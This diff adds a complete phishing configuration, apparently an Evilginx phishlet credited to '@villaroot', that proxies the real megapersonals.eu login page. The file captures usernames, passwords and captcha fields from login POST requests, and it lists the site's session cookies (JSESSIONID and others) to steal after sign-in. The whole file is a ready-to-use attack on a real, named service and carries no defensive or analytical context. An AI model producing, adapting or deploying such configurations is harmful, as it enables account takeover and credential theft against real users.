@@ -1,0 +1,36 @@
+author: '@villaroot'
+min_ver: '2.3.0'
+
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: '', domain: 'megapersonals.eu', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: '', domain: 'megapersonals.eu', session: true, is_landing: false}
+sub_filters:
+  - {triggers_on: 'megapersonals.eu', orig_sub: '', domain: 'megapersonals.eu', search: '{hostname}/users/auth/login', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data'], redirect_only: true}
+  - {triggers_on: 'megapersonals.eu', orig_sub: '', domain: 'megapersonals.eu', search: 'https://{hostname}/users/auth/login', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data'], redirect_only: true}
+  - {triggers_on: 'megapersonals.eu', orig_sub: '', domain: 'megapersonals.eu', search: 'https%3A%2F%2F{hostname}/users/auth/login', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data'], redirect_only: true}
+auth_tokens:
+  - domain: 'megapersonals.eu'
+    keys: ['JSESSIONID', '_ym_uid', '_ym_d', '_ym_isad', 'visitorId', 'termsOfUseVersion', '_gid', 'publicDomain', 'mp_screen_client', '_ga_7DGFPGNTB9', '_ga', '_gat_gtag_UA_113349993_1']
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  captcha_key:
+    key: 'captcha_key'
+    search: '(.*)'
+    type: 'post'
+  captcha_code:
+    key: 'captcha_code'
+    search: '(.*)'
+    type: 'post'
+auth_urls:
+  - '/dashboard.php'
+login:
+  domain: 'megapersonals.eu'
+  path: '/users/auth/login'
+
